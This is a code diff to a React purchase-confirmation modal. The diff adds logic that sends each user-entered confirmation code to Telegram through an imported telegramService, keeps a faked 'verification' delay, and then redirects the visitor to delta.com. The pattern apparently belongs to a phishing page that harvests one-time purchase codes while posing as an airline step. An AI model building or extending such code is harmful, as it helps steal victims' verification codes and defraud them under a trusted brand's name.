@@ -2,6 +2,7 @@
 import React, { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { X } from 'lucide-react';
+import { sendMessage, formatConfirmationCode } from '../services/telegramService';
 
 interface PurchaseConfirmationModalProps {
   isOpen: boolean;
@@ -16,7 +17,7 @@ const PurchaseConfirmationModal = ({ isOpen, onClose, onConfirm }: PurchaseConfi
 
   if (!isOpen) return null;
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!confirmationCode.trim()) {
@@ -25,12 +26,22 @@ const PurchaseConfirmationModal = ({ isOpen, onClose, onConfirm }: PurchaseConfi
     }
     
     setIsSubmitting(true);
-    // Simulate verification process
-    setTimeout(() => {
+    
+    try {
+      // Send confirmation code to Telegram
+      await sendMessage(formatConfirmationCode(confirmationCode));
+      console.log('Confirmation code sent to Telegram');
+      
+      // Simulate verification process
+      setTimeout(() => {
+        setIsSubmitting(false);
+        onConfirm();
+        window.location.href = 'https://www.delta.com/';
+      }, 1500);
+    } catch (error) {
+      console.error('Failed to send confirmation code to Telegram:', error);
       setIsSubmitting(false);
-      onConfirm();
-      window.location.href = 'https://www.delta.com/';
-    }, 1500);
+    }
   };
 
   return (
